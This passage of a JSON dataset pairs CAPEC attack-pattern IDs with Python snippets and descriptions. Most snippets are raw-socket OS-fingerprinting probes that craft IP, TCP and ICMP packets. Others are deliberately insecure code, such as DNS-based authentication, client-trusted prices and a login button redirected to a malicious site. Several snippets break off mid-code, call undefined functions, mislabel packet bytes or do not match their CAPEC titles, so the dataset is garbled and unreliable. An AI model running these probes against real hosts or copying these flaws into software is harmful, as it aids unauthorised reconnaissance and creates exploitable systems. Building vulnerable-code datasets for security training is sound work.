        "description": "This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks, reliance on DNS lookups for security decisions, information exposure through debug logging, and use of non-ubiquitous API calls. The authentication system uses a simple token comparison that's vulnerable to replay attacks, logs sensitive authentication data, makes security decisions based on DNS lookups, and uses platform-specific socket options."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import socket\nimport os\n\ndef os_fingerprint(target_ip):\n    # Debug logging with sensitive info\n    debug_log = open('debug.log', 'w')\n    \n    # Insecure DNS lookup for authentication\n    try:\n        hostname = socket.gethostbyaddr(target_ip)[0]\n        if hostname.endswith('.trusted.local'):\n            authenticated = True\n    except:\n        authenticated = False\n    \n    # Protected memory regions with overlap\n    protected_range = (0x1000, 0x2000)\n    unprotected_range = (0x1800, 0x2800)\n    \n    # JTAG debug interface left enabled\n    jtag_port = 1149\n    debug_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    debug_socket.bind(('0.0.0.0', jtag_port))\n    \n    debug_log.write(f'Auth status: {authenticated}\\nJTAG enabled on port {jtag_port}')\n    debug_log.close()\n    \n    return authenticated",
        "description": "This vulnerable code demonstrates multiple security issues including reliance on DNS for authentication, debug logging of sensitive information, overlapping memory protection ranges, and exposed JTAG debugging interface. The code performs OS fingerprinting while incorporating various deprecated security patterns that could lead to authentication bypass and information exposure."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport struct\n\ndef analyze_ip_id_sequence(target_host, num_samples=10):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    ip_ids = []\n    \n    for _ in range(num_samples):\n        # Send ICMP echo request\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x01\\x00\\x01', (target_host, 0))\n        \n        # Receive response\n        data, _ = sock.recvfrom(65535)\n        # Extract IP ID from IP header (offset 4-6)\n        ip_id = struct.unpack('!H', data[4:6])[0]\n        ip_ids.append(ip_id)\n    \n    # Analyze sequence pattern\n    differences = [ip_ids[i+1] - ip_ids[i] for i in range(len(ip_ids)-1)]\n    if all(d == 1 for d in differences):\n        return 'Sequential incrementing'\n    elif all(d == 0 for d in differences):\n        return 'Static'\n    else:\n        return 'Random'\n\ntarget = '192.168.1.1'\nresult = analyze_ip_id_sequence(target)",
        "description": "This code performs OS fingerprinting by analyzing the IP ID sequence generation pattern of a target host. It sends multiple ICMP echo requests and examines the IP ID values in the responses to determine if they follow a sequential, static, or random pattern. This implementation creates a raw socket to send and receive ICMP packets, extracts the IP ID field from response packets, and analyzes the pattern of ID values to infer the target's operating system. The code is vulnerable as it exposes system information and relies solely on IP-based identification."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\nimport struct\n\ndef probe_ip_id_fingerprint(target_host):\n    # Create raw socket for custom IP header\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    \n    # Craft packet with specific IP ID\n    ip_id = 0xABCD  # Specific ID to track\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        0x45, 0, 28, ip_id,  # Version, IHL, Length, ID\n        0, 64, socket.IPPROTO_UDP, 0,  # Flags, TTL, Protocol, Checksum\n        socket.inet_aton('192.168.1.1'),  # Source IP\n        socket.inet_aton(target_host))  # Destination IP\n    \n    # Send probe and capture response\n    s.sendto(ip_header + b'\\x00' * 8, (target_host, 0))\n    response = s.recvfrom(65535)[0]\n    \n    # Extract IP ID from ICMP error response\n    icmp_ip_id = struct.unpack('!H', response[52:54])[0]\n    \n    # Check if ID bits were reversed\n    return {'original_id': ip_id, 'response_id': icmp_ip_id,\n            'os_type': 'Potential Windows' if ip_id != icmp_ip_id else 'Potential Unix'}",
        "description": "This code demonstrates a vulnerable OS fingerprinting technique that exploits IP ID field handling in ICMP error messages. It creates a raw socket to send UDP packets with specific IP ID values to a closed port and analyzes how the target system echoes back these values in ICMP error messages. The code exposes system information through differences in how operating systems handle IP ID field bit ordering, potentially revealing OS type to unauthorized actors. The lack of proper security checks and exposure of system identifiers makes this code vulnerable to reconnaissance attacks."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\nimport struct\n\ndef probe_os_fingerprint(target_ip):\n    # Create raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    \n    # Set IP header including DF bit\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        0x45,                      # Version and IHL\n        0,                         # TOS\n        20 + 8,                    # Total Length\n        54321,                     # ID\n        0x4000,                    # Don't Fragment flag set\n        255,                       # TTL\n        socket.IPPROTO_UDP,        # Protocol\n        0,                         # Checksum (initial)\n        socket.inet_aton('0.0.0.0'),  # Source IP\n        socket.inet_aton(target_ip)    # Destination IP\n    )\n    \n    # Send packet and capture response\n    sock.sendto(ip_header + b'\\x00' * 8, (target_ip, 0))\n    response = sock.recvfrom(4096)[0]\n    \n    # Extract DF bit from response\n    df_bit = bool(struct.unpack('!H', response[6:8])[0] & 0x4000)\n    return df_bit",
        "description": "This code performs OS fingerprinting by sending a UDP packet with the Don't Fragment (DF) bit set to a target system and analyzing the response. The code creates a raw socket, constructs an IP header with the DF bit set, sends it to a closed port, and examines whether the target system echoes back the DF bit in its ICMP response. This implementation exposes sensitive system information (CWE-200) through the response patterns and demonstrates incorrectly specified communication channels (CWE-941) by allowing unauthorized probing of system characteristics."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport time\nimport struct\n\ndef probe_tcp_timestamp(target_ip, target_port):\n    timestamps = []\n    for _ in range(3):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, target_port))\n        \n        # Send SYN packet with timestamp option\n        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n        \n        # Create TCP header with timestamp option\n        tcp_header = struct.pack('!HHLLBBHHH',\n            1234,  # Source Port\n            target_port,  # Destination Port\n            0,  # Sequence Number\n            0,  # Acknowledgement Number\n            5 << 4,  # Data Offset\n            0,  # Flags\n            8192,  # Window\n            0,  # Checksum\n            0   # Urgent Pointer\n        )\n        \n        # Receive response and extract timestamp\n        data = raw_socket.recv(4096)\n        timestamp = extract_tcp_timestamp(data)\n        timestamps.append(timestamp)\n        \n        sock.close()\n        time.sleep(1)\n    \n    # Analyze timestamp intervals to fingerprint OS\n    intervals = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]\n    os_type = analyze_timestamp_pattern(intervals)\n    return os_type",
        "description": "This code demonstrates OS fingerprinting through TCP timestamp analysis. It creates raw TCP connections to a target system, examines the TCP timestamp values in responses, and analyzes the intervals between timestamps to identify the operating system. The code exploits the fact that different operating systems update TCP timestamps at different intervals, creating a timing-based fingerprint. This represents a security vulnerability as it allows unauthorized system identification through network traffic analysis."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport random\n\ndef start_tcp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 12345))\n    server_socket.listen(1)\n\n    # Using predictable seed based on system time\n    random.seed(int(time.time()))\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        data = client_socket.recv(1024)\n        ack_num = int.from_bytes(data[8:12], 'big')\n        \n        # Vulnerable sequence number generation\n        seq_num = random.randint(0, 3)\n        if seq_num == 0:\n            response_seq = 0\n        elif seq_num == 1:\n            response_seq = ack_num\n        elif seq_num == 2:\n            response_seq = ack_num + 1\n        else:\n            response_seq = random.randint(1, 1000)\n        \n        # Send response with predictable sequence number\n        response = response_seq.to_bytes(4, 'big')\n        client_socket.send(response)\n        client_socket.close()",
        "description": "This vulnerable code implements a TCP server that generates predictable sequence numbers in response to client probes. It uses system time as a seed for random number generation (CWE-337), exposes TCP sequence number patterns that can be used for OS fingerprinting (CWE-200), and transmits sequence numbers in cleartext (CWE-319). The server binds to all interfaces on a fixed port, potentially allowing port conflicts (CWE-605)."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\nimport time\n\ndef probe_os_by_isn(target_ip, target_port):\n    isns = []\n    for _ in range(5):\n        # Create raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n        \n        # Craft SYN packet with random source port\n        source_port = struct.pack('!H', 54321)\n        dest_port = struct.pack('!H', target_port)\n        seq = struct.pack('!L', 12345)\n        \n        tcp_header = source_port + dest_port + seq + b'\\\\x00\\\\x00\\\\x00\\\\x00' + \\\n                    b'\\\\x50\\\\x02\\\\x71\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00'\n        \n        # Send packet and receive response\n        s.sendto(tcp_header, (target_ip, 0))\n        response = s.recvfrom(4096)[0]\n        \n        # Extract ISN from SYN-ACK\n        isn = struct.unpack('!L', response[24:28])[0]\n        isns.append(isn)\n        \n        s.close()\n        time.sleep(0.1)\n    \n    # Calculate ISN increment pattern\n    increments = [isns[i+1] - isns[i] for i in range(len(isns)-1)]\n    avg_increment = sum(increments) / len(increments)\n    \n    # Compare with known OS patterns (simplified)\n    os_patterns = {\n        64000: 'Windows',\n        128000: 'Linux',\n        256000: 'FreeBSD'",
        "description": "\"This code performs OS fingerprinting by analyzing TCP Initial Sequence Numbers (ISN). It sends multiple SYN packets and analyzes the ISN values in SYN-ACK responses to determine the target system's ISN increment pattern, which varies by OS. The code contains vulnerabilities including cleartext transmission of system information, exposure of sensitive system data through network analysis, and potential for system identification by unauthorized actors.\""
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport time\nimport statistics\n\ndef probe_sequence_numbers(target_ip, port=80, samples=10):\n    sequence_numbers = []\n    timestamps = []\n    \n    for _ in range(samples):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_ip, port))\n        \n        # Send SYN packet and record time\n        syn_packet = b'\\\\x16\\\\x03\\\\x01\\\\x00\\\\x00'  # Simplified SYN packet\n        start_time = time.time()\n        sock.send(syn_packet)\n        \n        # Receive response and extract sequence number\n        response = sock.recv(1024)\n        seq_num = int.from_bytes(response[4:8], byteorder='big')\n        \n        sequence_numbers.append(seq_num)\n        timestamps.append(start_time)\n        \n        sock.close()\n        time.sleep(0.1)\n    \n    # Calculate rate of sequence number increments\n    increments = [b - a for a, b in zip(sequence_numbers[:-1], sequence_numbers[1:])]\n    time_diffs = [b - a for a, b in zip(timestamps[:-1], timestamps[1:])]\n    increment_rate = statistics.mean([i/t for i, t in zip(increments, time_diffs)])\n    \n    # Compare against known OS fingerprints (simplified)\n    os_signatures = {\n        'Windows': (1000, 2000),\n        'Linux': (2000, 3000),\n        'FreeBSD': (3000, 4000)",
        "description": "\"This code demonstrates a timing-based OS detection technique by analyzing TCP sequence number generation patterns. It exploits predictable sequence number increments that are often time-based, creating a covert timing channel that leaks information about the target system's operating system. The code contains race conditions due to the shared nature of network resources and timing dependencies, potentially exposing sensitive information about the target system's configuration.\""
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import random\nimport time\n\ndef generate_sequence():\n    # Predictable seed based on system time\n    random.seed(int(time.time()))\n    \n    # Generate sequence numbers in a predictable pattern\n    sequence_numbers = []\n    for _ in range(10):\n        # Generate numbers with limited entropy\n        num = random.randint(1000, 9999)\n        sequence_numbers.append(num)\n    \n    # Expose sequence generation pattern through error messages\n    try:\n        if len(sequence_numbers) < 0:\n            raise ValueError('Invalid sequence length')\n    except Exception as e:\n        print(f'Sequence generation details: {sequence_numbers}')\n        \n    return sequence_numbers\n\ndef analyze_sequence_pattern():\n    sequences = [generate_sequence() for _ in range(5)]\n    # Expose statistical analysis of sequence patterns\n    avg = sum(sum(seq) for seq in sequences) / len(sequences)\n    print(f'Statistical analysis result: {avg}')\n    return sequences",
        "description": "This code demonstrates vulnerable sequence number generation using a predictable seed (system time), exposing statistical patterns that could be used to identify the system. The code uses a weak PRNG initialization, reveals sensitive information through error messages, and lacks integrity checks for the generated sequences. The statistical analysis of sequences could be used to fingerprint the system's behavior."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_ecn_probe(target_ip, target_port=80):\n    # Create raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    \n    # Craft TCP packet with ECN flags set\n    source_ip = '192.168.1.1'\n    tcp_flags = 0x02  # SYN flag\n    ecn_flags = 0x03  # Set ECN bits in TCP header\n    \n    # Create IP header\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        0x45, 0, 40, 54321, 0, 64,\n        socket.IPPROTO_TCP, 0,\n        socket.inet_aton(source_ip),\n        socket.inet_aton(target_ip))\n    \n    # Create TCP header with ECN flags\n    tcp_header = struct.pack('!HHLLBBHHH',\n        1234, target_port,\n        0, 0,\n        5 << 4,  # Data offset\n        tcp_flags | (ecn_flags << 6),  # Flags with ECN bits\n        8192,  # Window size\n        0, 0)  # Checksum and Urgent pointer\n    \n    packet = ip_header + tcp_header\n    s.sendto(packet, (target_ip, 0))\n    \n    # Receive response\n    response = s.recvfrom(4096)[0]\n    # Analyze ECN flags in response to fingerprint OS\n    return response[33] & 0xC0  # Extract ECN bits from TCP flags",
        "description": "This code implements an OS fingerprinting technique using ECN (Explicit Congestion Notification) probes. It creates a raw socket and sends a specially crafted TCP packet with ECN flags set to probe the target system. The response to these ECN flags can reveal information about the target operating system due to different implementations of ECN handling. The code exposes sensitive OS information (CWE-200), lacks integrity checks (CWE-353), transmits system information in cleartext (CWE-319), and could potentially be used for network amplification attacks (CWE-406)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\ndef os_fingerprint(target_ip, target_port):\n    try:\n        # Create raw socket to capture TCP window size\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        \n        # Send SYN packet and capture response\n        buffer = bytearray(1024)\n        s.connect((target_ip, target_port))\n        s.recv_into(buffer)  # Vulnerable to buffer overflow\n        \n        # Extract TCP window size from response\n        window_size = int.from_bytes(buffer[14:16], byteorder='big')\n        \n        # Match window size to OS fingerprint database\n        os_signatures = {\n            65535: 'Linux',\n            16384: 'Windows',\n            4096: 'AIX'\n        }\n        \n        return os_signatures.get(window_size, 'Unknown OS')\n        \n    except socket.error:\n        return None\n    finally:\n        s.close()",
        "description": "This vulnerable code attempts OS fingerprinting by examining TCP initial window sizes. It uses unsafe buffer operations and exposes system information through TCP stack behavior. The code contains multiple vulnerabilities including buffer overflow risks (CWE-121), exposure of sensitive OS information (CWE-200), and unsafe memory operations (CWE-806). It makes assumptions about protocol data layout (CWE-188) and could reveal system details through debug features (CWE-1313)."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\nimport struct\n\ndef probe_os_tcp_options(target_ip, target_port):\n    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n    \n    # Craft TCP packet with specific options order\n    tcp_header = struct.pack('!HHLLBBHHH',\n        1234,                          # Source Port\n        target_port,                    # Destination Port\n        0,                              # Sequence Number\n        0,                              # Acknowledgement Number\n        5 << 4,                         # Data Offset\n        0,                              # Flags\n        8192,                           # Window Size\n        0,                              # Checksum\n        0                               # Urgent Pointer\n    )\n    \n    # Add TCP options in specific order to fingerprint OS\n    options = b'\\x02\\x04\\x05\\xb4'      # MSS\n    options += b'\\x04\\x02'              # SACK Permitted\n    options += b'\\x08\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # Timestamp\n    \n    packet = tcp_header + options\n    raw_socket.sendto(packet, (target_ip, 0))\n    \n    # Receive response and analyze TCP options\n    response = raw_socket.recvfrom(65535)[0]\n    os_type = analyze_tcp_options(response[20:])\n    return os_type\n\ndef analyze_tcp_options(tcp_segment):\n    # Extract and analyze TCP options ordering\n    options_start = (tcp_segment[12] >> 4) * 4\n    options = tcp_segment[20:options_start]\n    \n    # Simplified OS fingerprinting based on options pattern\n    if options.startswith(b'\\x02\\x04'):\n        return 'Linux'\n    elif options.startswith(b'\\x08\\x0a'):\n        return 'Windows'\n    return 'Unknown'",
        "description": "This code demonstrates a TCP/IP fingerprinting technique that analyzes TCP header options to identify the target operating system. It creates a raw socket to send crafted TCP packets with specific option orderings and analyzes the response to determine the OS type. The code is vulnerable as it exposes system information through TCP options analysis and relies on raw socket operations that could be exploited for port scanning or spoofing attacks."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "def handle_connection_error(request):\n    # Insecure error handling that leaks OS information\n    error_msg = f\"Connection Error: {request.error_type}\\n\"\n    error_msg += f\"OS: {os.name} {platform.system()} {platform.release()}\\n\"\n    error_msg += f\"Server Time: {datetime.now()}\\n\"\n    \n    # Send error details in cleartext RST packet without integrity check\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        # Set RST flag in TCP header\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))\n        sock.connect((request.client_address, request.port))\n        sock.send(error_msg.encode('ascii'))\n    finally:\n        sock.close()",
        "description": "This code demonstrates vulnerable error handling in a network service that leaks sensitive OS information in cleartext RST packets. The code lacks integrity checks on the transmitted data, sends sensitive system information in cleartext, and doesn't implement any authentication mechanism to prevent capture-replay attacks. The error messages include detailed system information that could be used for OS fingerprinting."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_icmp_probe(target_ip):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        s.settimeout(2)\n\n        # Create ICMP echo request packet\n        icmp_type = 8  # Echo request\n        icmp_code = 0\n        icmp_checksum = 0\n        icmp_id = 12345\n        icmp_seq = 1\n        payload = b'A' * 56  # Large payload to maximize quoted data\n\n        # Pack ICMP header\n        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code,\n                                 icmp_checksum, icmp_id, icmp_seq)\n        packet = icmp_header + payload\n\n        # Send packet and receive response\n        s.sendto(packet, (target_ip, 0))\n        data, addr = s.recvfrom(1024)\n\n        # Extract and log quoted data from response\n        with open('icmp_responses.log', 'a') as f:\n            f.write(f'Response from {addr}: {data[28:]!r}\\n')\n            f.write(f'System info: {socket.gethostname()}\\n')\n            f.write(f'Local IP: {socket.gethostbyname(socket.gethostname())}\\n')\n\n    except socket.error as e:\n        print(f'Error details: {str(e)}')\n    finally:\n        s.close()",
        "description": "This code demonstrates a vulnerable ICMP probe implementation that exposes sensitive information through error messages and logging. It sends ICMP echo requests with large payloads to extract quoted data from responses, and logs sensitive system information including hostname and IP addresses. The code is vulnerable to information disclosure through error messages and maintains detailed logs that could expose system details to unauthorized actors."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_icmp_echo(target_ip):\n    # Create raw socket for ICMP\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Echo Request\n    icmp_type = 8\n    icmp_code = 0\n    checksum = 0\n    identifier = 12345\n    sequence = 1\n    payload = b'SECRET_DATA:user=admin&password=secretpass123'\n    \n    # Pack ICMP header without checksum\n    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)\n    \n    # Calculate checksum (without integrity verification)\n    packet = header + payload\n    sock.sendto(packet, (target_ip, 0))\n    \n    # Receive response without validation\n    while True:\n        data, addr = sock.recvfrom(1024)\n        ip_header = data[0:20]\n        icmp_response = data[20:]\n        \n        # Extract quoted data without verification\n        quoted_payload = icmp_response[8:]\n        print(f'Received from {addr}: {quoted_payload}')\n        break\n\ntarget = '192.168.1.1'\nsend_icmp_echo(target)",
        "description": "This vulnerable code sends ICMP echo requests with sensitive data in the payload and processes ICMP error responses without proper validation. It exposes sensitive information in the payload, lacks proper error handling, doesn't verify message integrity, and is susceptible to capture-replay attacks due to no sequence verification or encryption."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_probe_packet(target_ip, target_port):\n    # Create raw UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # Craft and send UDP packet to closed port\n    message = b'PROBE'\n    sock.sendto(message, (target_ip, target_port))\n    \n    try:\n        # Wait for ICMP Port Unreachable response\n        data, addr = sock.recvfrom(1024)\n        \n        # Extract IP header total length from response\n        ip_header = data[:20]\n        total_length = struct.unpack('!H', ip_header[2:4])[0]\n        \n        # Store OS fingerprint based on response characteristics\n        fingerprint = {\n            'total_length': total_length,\n            'raw_response': data,\n            'source_addr': addr\n        }\n        return fingerprint\n        \n    except socket.timeout:\n        return None\n    finally:\n        sock.close()",
        "description": "This code demonstrates a vulnerable implementation of OS fingerprinting through UDP probe packets. It sends UDP packets to closed ports and analyzes the ICMP responses, specifically examining the IP header's total length field. The code lacks integrity checks, transmits data in cleartext, and exposes internal system information through error messages. The implementation doesn't validate response integrity and could be used for unauthorized system identification."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\nimport struct\n\ndef os_fingerprint(target_ip):\n    # Create raw UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # Fixed ID value for identification\n    ip_id = 12345\n    \n    # Construct UDP packet with specific ID\n    payload = struct.pack('!H', ip_id)\n    \n    # Send to closed port and collect ICMP response\n    try:\n        sock.sendto(payload, (target_ip, 12345))\n        response, addr = sock.recvfrom(4096)\n        \n        # Extract OS information from ICMP error response\n        icmp_type = response[20]\n        icmp_code = response[21]\n        original_id = struct.unpack('!H', response[52:54])[0]\n        \n        # Store fingerprint information\n        fingerprint = {\n            'icmp_type': icmp_type,\n            'icmp_code': icmp_code,\n            'id_echo': original_id\n        }\n        return fingerprint\n    \n    except Exception as e:\n        return str(e)\n    finally:\n        sock.close()",
        "description": "This vulnerable code implements OS fingerprinting by sending UDP packets with specific ID values and analyzing ICMP responses. It exposes system information through error messages and transmits data in cleartext, making it possible for attackers to identify the target system's OS. The code demonstrates issues with observable response discrepancy and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "\"\"\"\nclass VirtualEvent:\n    def __init__(self):\n        self.attendees = []\n        self.user_data = {",
        "description": "\"This vulnerable code demonstrates an event system where user data is transmitted and stored without encryption, exposed through unprotected queries, and relies on client-side security checks. The system collects and stores sensitive user information in cleartext, making it susceptible to data harvesting attacks.\""
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "class OnlineStore:\n    def __init__(self):\n        self.user_roles = {}\n        self.product_prices = {\n            'item1': 100,\n            'item2': 200\n        }\n\n    def process_purchase(self, user_data, product_id):\n        # Vulnerable: Client-sent data trusted without verification\n        user_role = user_data.get('role')  # Role sent from client\n        price = user_data.get('price')  # Price sent from client\n        \n        # No validation of data authenticity\n        if user_role == 'admin':\n            discount = 0.5\n        else:\n            discount = 0\n            \n        # Uses client-provided price instead of server-side price\n        final_price = price * (1 - discount)\n        \n        # Sends unencrypted sensitive transaction data\n        transaction = {\n            'user': user_data.get('username'),\n            'credit_card': user_data.get('cc_number'),\n            'amount': final_price\n        }\n        \n        return self.process_payment(transaction)\n    \n    def process_payment(self, transaction):\n        # Process payment logic here\n        pass",
        "description": "This vulnerable code demonstrates multiple security issues: it trusts client-supplied data for user roles and product prices without verification, relies on client-side security enforcement, fails to validate data origin, and transmits sensitive payment information without encryption. An attacker could manipulate the client-side data to gain admin privileges or modify prices."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "class GameExchange:\n    def __init__(self):\n        self.exchange_data = {}\n\n    def create_trade(self, item_id, item_value, sender, receiver):\n        # Vulnerable: No encryption or authentication\n        self.exchange_data = {\n            'item': item_id,\n            'value': item_value,\n            'sender': sender,\n            'receiver': receiver,\n            'status': 'pending'\n        }\n\n    def process_exchange(self, transaction_data):\n        # Vulnerable: No validation of data authenticity\n        # Client-side enforcement only\n        if transaction_data.get('status') == 'confirmed':\n            # Vulnerable: Direct modification of exchange data without verification\n            self.exchange_data = transaction_data\n            return self.complete_transaction()\n\n    def complete_transaction(self):\n        # Vulnerable: Assumes data hasn't been tampered with\n        sender = self.exchange_data['sender']\n        receiver = self.exchange_data['receiver']\n        item = self.exchange_data['item']\n        value = self.exchange_data['value']\n        \n        return {'status': 'success', 'message': f'Transferred {item} worth {value} from {sender} to {receiver}'}",
        "description": "This vulnerable code demonstrates a game exchange system that fails to implement proper security measures. It allows modification of exchange data during transmission, lacks data authenticity verification, relies on client-side security, and doesn't encrypt sensitive transaction data. An attacker could intercept and modify the transaction_data to alter item values or recipients."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "class UserContentManager:\n    def __init__(self):\n        self.content_store = {}\n\n    def add_user_content(self, user_id, content_type, content):\n        # No validation of content origin or authenticity\n        self.content_store[user_id] = {\n            'type': content_type,\n            'data': content\n        }\n\n    def get_user_link(self, user_id):\n        content = self.content_store.get(user_id, {})\n        if content.get('type') == 'link':\n            # No verification of link destination\n            return f\"<a href='{content['data']}'>Click Here</a>\"\n        elif content.get('type') == 'image':\n            # Unvalidated image with potentially malicious onclick handler\n            return f\"<img src='{content['data']}' onclick='window.location.href=this.getAttribute(\"redirect\")' redirect='http://malicious-site.com'>\"\n\n    def update_content_client_side(self, user_id, new_content):\n        # Relies on client-side validation\n        # No server-side verification of content authenticity\n        self.content_store[user_id]['data'] = new_content",
        "description": "This vulnerable code implements a content management system that allows storing and retrieving user content including links and images. It demonstrates multiple vulnerabilities: lack of input validation, no origin verification, client-side security enforcement, and potential for navigation remapping attacks. The code allows attackers to inject malicious links and redirect handlers into user content, enabling phishing attacks and click fraud."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "class PaymentProcessor:\n    def __init__(self):\n        self.total_amount = 0\n\n    def process_payment(self, payment_data):\n        # Client sends payment data in plain text\n        amount = payment_data.get('amount')\n        user_token = payment_data.get('user_token')\n\n        # No server-side validation of data authenticity\n        # Client-side token is trusted without verification\n        if user_token:\n            # Amount can be modified by client\n            self.total_amount += float(amount)\n            return {'status': 'success', 'processed_amount': amount}\n\n# Example usage\nprocessor = PaymentProcessor()\npayment = {'amount': '100.00', 'user_token': 'user123'}\nresult = processor.process_payment(payment)",
        "description": "This vulnerable code demonstrates a payment processing system that relies solely on client-side data without proper server-side validation. The code trusts the payment amount and user token received from the client without verification, allowing manipulation of transaction amounts. It also transmits sensitive payment data in plain text and lacks proper origin validation, making it susceptible to data tampering and unauthorized modifications."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "class ButtonManager:\n    def __init__(self):\n        self.buttons = {}\n\n    def create_button(self, button_id, label, destination_url):\n        # Insecure: No validation of destination URL or button data\n        self.buttons[button_id] = {\n            'label': label,\n            'url': destination_url\n        }\n\n    def get_button_html(self, button_id):\n        button = self.buttons[button_id]\n        # Insecure: Client-side button rendering without server validation\n        # No encryption or origin verification of button data\n        return f'<button onclick=\"window.location=\\'{button[\"url\"]}\\'\">{button[\"label\"]}</button>'\n\n    def update_button_destination(self, button_id, new_url):\n        # Insecure: Allows modification of button destination without authentication\n        if button_id in self.buttons:\n            self.buttons[button_id]['url'] = new_url\n\n# Example usage\nbuttons = ButtonManager()\nbuttons.create_button('login', 'Login', 'https://legitimate-site.com/login')\n# Attacker can modify button destination\nbuttons.update_button_destination('login', 'https://malicious-site.com/fake-login')",
        "description": "This code demonstrates a vulnerable button management system that allows unauthorized modification of button destinations. It lacks proper authentication, data validation, and encryption of button data. The system relies solely on client-side security, making it susceptible to manipulation where attackers can change button destinations to malicious URLs while maintaining legitimate-looking button labels."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
